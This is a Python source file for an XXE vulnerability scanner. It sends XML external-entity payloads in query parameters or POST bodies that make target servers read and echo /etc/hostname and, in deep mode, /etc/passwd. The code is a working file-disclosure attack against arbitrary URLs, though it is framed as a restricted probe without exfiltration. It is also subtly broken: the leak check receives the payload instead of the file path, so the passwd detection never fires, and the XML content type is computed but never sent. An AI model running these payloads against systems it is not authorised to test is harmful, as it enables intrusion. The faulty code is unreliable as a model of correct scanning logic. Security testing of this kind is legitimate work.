"""
xxe_scanner.py — local-file XXE probes for XML-accepting endpoints.

Targets are URLs carrying a file/xml/data/payload-style query param (probed
via GET) or, with allow_post=True, a bare URL that accepts an XML body.

Probes embed a parameter entity that expands to a benign local file:
  - file:///etc/hostname          (always)
  - file:///etc/passwd            (only with deep=True)

Signals: the response body contains the entity content (a hostname token or a
"root:" passwd line) = finding. A response error mentioning DOCTYPE/XXE/XML
parser details is recorded as a note only (blind-XXE hint), never a finding.

SAFETY: no OOB, no network exfiltration, no external DTDs - the file is read
        locally BY THE TARGET and echoed into its own response. We never send
        the entity result anywhere else and never fetch external systems.
"""

import asyncio
import os
import re
import sys
from typing import Dict, List, Optional
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import aiohttp

if __package__ in (None, ""):
    sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..")))

from app.utils.user_agents import PROGRAM_UA_TAG

_UA = f"Mozilla/5.0 {PROGRAM_UA_TAG}"
_DOC_PARAMS = ("file", "xml", "data", "payload")
_BASELINE_XML = '<?xml version="1.0"?><root/>'
_NOTE_HINTS = ("doctype", "!entity", "xmlparser", "xmlparseerror",
               "dom parser", "parser error", "parsing failed", "parseerror",
               "unexpected token", "dtd", "well-formed")
_STOP_TOKENS = {"root", "xxe", "doctype", "public", "null", "none", "false",
                "true", "undefined", "version", "encoding", "standalone",
                "http", "https", "www", "xml", "html", "body", "div", "script",
                "error", "errors", "warning", "debug", "page", "line", "text",
                "value", "document", "parser"}


def xml_probe(path: str) -> str:
    return (f'<?xml version="1.0"?><!DOCTYPE root '
            f'[<!ENTITY xxe SYSTEM "file://{path}">]><root>&xxe;</root>')


def set_param_value(url: str, param: str, value: str) -> str:
    parts = urlsplit(url)
    query = [(k, value if k == param else v)
             for k, v in parse_qsl(parts.query, keep_blank_values=True)]
    if not query:
        query = [(param, value)]
    return urlunsplit((parts.scheme, parts.netloc, parts.path,
                       urlencode(query), parts.fragment))


def _root_element_content(body: str) -> str:
    m = re.search(r"<root>\s*([^<>]*?)\s*</root>", body, re.S)
    if not m:
        return ""
    v = m.group(1).strip()
    return "" if ("&" in v or ";" in v or not v) else v


def _hostname_token(body: str, baseline: str) -> str:
    base_lines = {ln.strip() for ln in (baseline or "").splitlines()}
    for ln in body.splitlines():
        t = ln.strip()
        if (len(t) >= 3 and re.fullmatch(r"[a-z0-9](?:[a-z0-9-]{0,31})", t)
                and t.lower() not in _STOP_TOKENS and t not in base_lines):
            return t
    return ""


class XXEScanner:
    def __init__(self, timeout: float = 10.0, allow_post: bool = False,
                 deep: bool = False, concurrency: int = 4):
        self.timeout = timeout
        self.allow_post = allow_post
        self.deep = deep
        self.concurrency = concurrency

    async def _send(self, session, url: str, method: str, body: str):
        hdrs = {"User-Agent": _UA}
        content_type = "application/xml" if method == "POST" else None
        try:
            async with session.request(method, url, headers=hdrs,
                                       data=body if method == "POST" else None,
                                       params=None,
                                       timeout=self.timeout) as r:
                return r.status, await r.text(errors="replace")
        except Exception:
            return 0, None

    def _leak(self, path: str, body: Optional[str], baseline: Optional[str]) -> str:
        if not body:
            return ""
        root_v = _root_element_content(body)
        if root_v:
            return root_v
        if path.endswith("passwd"):
            m = re.search(r"root:.*?:0:0:", body)
            if m:
                return m.group(0)
        return _hostname_token(body, baseline)

    async def _scan_one(self, session, url: str, allow_post: bool,
                        deep: bool) -> List[Dict]:
        params = list(dict.fromkeys(
            k for k, _ in parse_qsl(urlsplit(url).query) if k in _DOC_PARAMS))
        if not params:
            if allow_post:
                return [await self._scan_body(session, url, "POST", deep)]
            return [{"url": url, "status": 0, "xxe": False, "leaked": "",
                     "note": "no doc-style param and allow_post=False"}]
        out = []
        for param in params:
            out.append(await self._scan_param(session, url, param, deep))
        return out

    async def _scan_param(self, session, url: str, param: str, deep: bool) -> Dict:
        marker_url = set_param_value(url, param, _BASELINE_XML)
        bs, baseline = await self._send(session, marker_url, "GET", _BASELINE_XML)
        probes = [("hostname", xml_probe("/etc/hostname"))]
        if deep:
            probes.append(("passwd", xml_probe("/etc/passwd")))
        entry = {"url": url, "status": bs, "xxe": False, "leaked": "",
                 "note": ""}
        for _, xml in probes:
            pu = set_param_value(url, param, xml)
            status, body = await self._send(session, pu, "GET", xml)
            entry["status"] = status
            if not body:
                continue
            leaked = self._leak(xml, body, baseline)
            if leaked:
                entry["xxe"] = True
                entry["leaked"] = leaked
                entry["note"] = "entity content echoed in response"
                break
            hints = [h for h in _NOTE_HINTS if h in body.lower()]
            if hints:
                entry["note"] = "parser error hint: " + ", ".join(hints[:3])
        if not entry["note"]:
            entry["note"] = "no signal"
        return entry

    async def _scan_body(self, session, url: str, method: str, deep: bool) -> Dict:
        bs, baseline = await self._send(session, url, method, _BASELINE_XML)
        probes = [("hostname", xml_probe("/etc/hostname"))]
        if deep:
            probes.append(("passwd", xml_probe("/etc/passwd")))
        entry = {"url": url, "status": bs, "xxe": False, "leaked": "",
                 "note": ""}
        for _, xml in probes:
            status, body = await self._send(session, url, method, xml)
            entry["status"] = status
            if not body:
                continue
            leaked = self._leak(xml, body, baseline)
            if leaked:
                entry["xxe"] = True
                entry["leaked"] = leaked
                entry["note"] = "entity content echoed in response"
                break
            hints = [h for h in _NOTE_HINTS if h in body.lower()]
            if hints:
                entry["note"] = "parser error hint: " + ", ".join(hints[:3])
        if not entry["note"]:
            entry["note"] = "no signal"
        return entry

    async def scan(self, urls: List[str], allow_post: Optional[bool] = None,
                   deep: Optional[bool] = None) -> List[Dict]:
        allow_post = self.allow_post if allow_post is None else allow_post
        deep = self.deep if deep is None else deep
        sem = asyncio.Semaphore(self.concurrency)
        async with aiohttp.ClientSession() as session:
            async def one(u):
                async with sem:
                    return await self._scan_one(session, u, allow_post, deep)
            results = await asyncio.gather(*(one(u) for u in urls))
        return [e for group in results for e in group]

    def scan_sync(self, urls: List[str], allow_post: Optional[bool] = None,
                  deep: Optional[bool] = None) -> List[Dict]:
        return asyncio.run(self.scan(urls, allow_post=allow_post, deep=deep))


def _main():
    urls = sys.argv[1:]
    if not urls:
        print(f"usage: {sys.argv[0]} [--post] [--deep] 'https://host/page?xml=1' [...]")
        sys.exit(1)
    post = "--post" in urls
    deep = "--deep" in urls
    urls = [u for u in urls if not u.startswith("--")]
    for e in XXEScanner(allow_post=post, deep=deep).scan_sync(urls):
        print(f"{e['status']} xxe={e['xxe']} leaked={e['leaked']!r} "
              f"note={e['note']} {e['url']}")


if __name__ == "__main__":
    _main()